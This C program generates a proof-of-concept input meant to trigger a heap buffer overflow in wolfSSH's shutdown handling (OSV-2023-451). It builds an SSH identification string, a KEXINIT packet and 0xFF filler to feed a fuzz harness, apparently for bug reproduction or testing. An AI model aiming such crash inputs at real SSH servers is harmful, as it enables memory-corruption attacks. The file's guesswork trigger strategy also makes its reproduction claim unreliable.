/*
 * gen_poc.c: Generate a binary PoC for OSV-2023-451
 *
 * The harness creates a wolfSSH server and feeds fuzz data as SSH client
 * protocol messages. The server processes the data via wolfSSH_accept()
 * and then calls wolfSSH_shutdown().
 *
 * Bug mechanism:
 *   wolfSSH_shutdown() -> SendChannelExit() -> PreparePacket()
 *   PreparePacket calls GrowBuffer(&ssh->outputBuffer, sz, usedSz) where
 *   usedSz is computed as (ssh->outputBuffer.length - ssh->outputBuffer.idx).
 *   But this calculation can be stale or wrong after partial sends.
 *   GrowBuffer allocates newSz = sz + usedSz, which can be too small.
 *   BundlePacket() then writes padding + MAC past the allocated buffer.
 *
 * Strategy: Send a partial SSH handshake that:
 *   1. Gets far enough to establish a channel (so shutdown tries to send exit)
 *   2. Leaves the output buffer in a state where usedSz is miscalculated
 *
 * The SSH protocol starts with a protocol identification string, then
 * KEXINIT messages. We send enough to trigger some processing.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>

static void put32be(unsigned char *p, uint32_t v) {
    p[0] = (v >> 24) & 0xFF;
    p[1] = (v >> 16) & 0xFF;
    p[2] = (v >> 8) & 0xFF;
    p[3] = v & 0xFF;
}

int main(int argc, char **argv) {
    const char *outfile = "poc.bin";
    FILE *f;
    unsigned char buf[4096];
    int pos = 0;

    if (argc > 1)
        outfile = argv[1];

    f = fopen(outfile, "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /*
     * SSH protocol identification string.
     * The server expects the client to send: "SSH-2.0-<softwareversion>\r\n"
     */
    const char *proto_id = "SSH-2.0-FuzzClient_1.0\r\n";
    memcpy(buf + pos, proto_id, strlen(proto_id));
    pos += strlen(proto_id);

    /*
     * SSH_MSG_KEXINIT (type 20) - Key Exchange Init
     *
     * Binary packet format:
     *   packet_length(4) | padding_length(1) | payload... | padding...
     *
     * KEXINIT payload:
     *   msg_type(1)=20 | cookie(16) | name-lists(10) | first_kex_follows(1) | reserved(4)
     *
     * Name-lists: kex_algorithms, server_host_key_algorithms,
     *   encryption_algorithms_c2s, encryption_algorithms_s2c,
     *   mac_algorithms_c2s, mac_algorithms_s2c,
     *   compression_algorithms_c2s, compression_algorithms_s2c,
     *   languages_c2s, languages_s2c
     */

    /* Build KEXINIT payload */
    unsigned char kexinit[512];
    int ki_pos = 0;

    /* Message type: SSH_MSG_KEXINIT = 20 */
    kexinit[ki_pos++] = 20;

    /* Cookie (16 random bytes) */
    memset(kexinit + ki_pos, 0x41, 16);
    ki_pos += 16;

    /* Name-lists: we use the simplest algorithms.
     * Each name-list: length(4) + string */
    const char *kex_alg = "diffie-hellman-group14-sha256";
    const char *host_key_alg = "ssh-rsa";
    const char *cipher = "aes128-cbc";
    const char *mac = "hmac-sha1";
    const char *compress = "none";
    const char *lang = "";

    const char *namelists[] = {
        kex_alg, host_key_alg,
        cipher, cipher,     /* c2s, s2c */
        mac, mac,           /* c2s, s2c */
        compress, compress, /* c2s, s2c */
        lang, lang          /* c2s, s2c */
    };

    for (int i = 0; i < 10; i++) {
        uint32_t nlen = strlen(namelists[i]);
        put32be(kexinit + ki_pos, nlen);
        ki_pos += 4;
        memcpy(kexinit + ki_pos, namelists[i], nlen);
        ki_pos += nlen;
    }

    /* first_kex_packet_follows = FALSE */
    kexinit[ki_pos++] = 0;

    /* reserved (4 bytes) */
    put32be(kexinit + ki_pos, 0);
    ki_pos += 4;

    /* Wrap in SSH binary packet */
    int padding_len = 8 - ((1 + ki_pos) % 8);
    if (padding_len < 4) padding_len += 8;

    int packet_len = 1 + ki_pos + padding_len;

    put32be(buf + pos, packet_len);
    pos += 4;
    buf[pos++] = (unsigned char)padding_len;
    memcpy(buf + pos, kexinit, ki_pos);
    pos += ki_pos;
    memset(buf + pos, 0, padding_len);
    pos += padding_len;

    /* Add some garbage data to trigger partial processing and state
     * that makes the output buffer calculations go wrong */
    memset(buf + pos, 0xFF, 128);
    pos += 128;

    fwrite(buf, 1, pos, f);
    fclose(f);
    fprintf(stderr, "Generated %s (%d bytes)\n", outfile, pos);
    return 0;
}
